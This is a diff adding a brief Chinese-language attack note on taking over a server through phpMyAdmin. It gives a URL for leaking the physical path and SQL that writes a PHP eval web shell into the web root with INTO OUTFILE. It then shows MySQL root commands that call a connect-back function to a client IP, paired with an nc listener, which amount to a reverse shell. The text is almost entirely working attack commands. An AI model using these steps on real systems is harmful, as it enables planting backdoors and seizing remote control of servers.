@@ -1,0 +1,14 @@
+phpmyadmin 后台得shell
+http://url/phpmyadmin/libraries/select_lang.lib.php 得到物理路径
+----start code---
+Create TABLE a (cmd text NOT NULL);
+Insert INTO a (cmd) VALUES('<?php eval($_POST[1]);?>');
+select cmd from a into outfile '/home/htdocs/www/ftj/bbs/d.php';
+Drop TABLE IF EXISTS a;
+----end code---
+
+root得系统权限
+mysql -h serverip -uroot -p
+\. c:\mysql.txt
+select Mixconnect('clientip','521');
+nc -vv -l -p 1983
